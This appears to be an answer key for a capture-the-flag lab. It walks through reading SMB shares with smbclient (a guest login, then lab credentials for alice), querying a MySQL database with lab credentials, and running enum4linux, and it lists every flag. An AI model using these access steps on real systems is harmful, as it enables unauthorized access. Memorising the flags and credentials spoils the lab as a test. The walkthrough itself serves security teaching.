# Lab 5 — CTF Walkthrough (Answer Key)

## Step 1: user.txt (public share, no credentials needed)

```bash
smbclient //10.10.5.12/public -N
smb: \> get user.txt
smb: \> exit
cat user.txt
```

Flag: `flag{lab5_smb_guest_accessed}`

## Step 2: root.txt (private share, needs valid creds)

```bash
smbclient //10.10.5.12/private -U alice%alice123
smb: \> get root.txt
smb: \> exit
cat root.txt
```

Flag: `flag{lab5_smb_valid_creds_private_share}`

(`bob:bob456` also exists but isn't authorized on the `private` share — only `alice` is listed in `valid users`.)

## Bonus: MySQL flag

```bash
mysql -h 10.10.5.11 -u dbuser -pdbpass123 --skip-ssl corpdb -e "SELECT * FROM notes;"
```

Flag: `flag{lab5_mysql_app_credentials_enumerated}`

## Lesson

`enum4linux -a 10.10.5.12` would have surfaced both the share names and the local usernames in one pass — worth running early, since it saves the manual `smbclient -L` + guesswork.
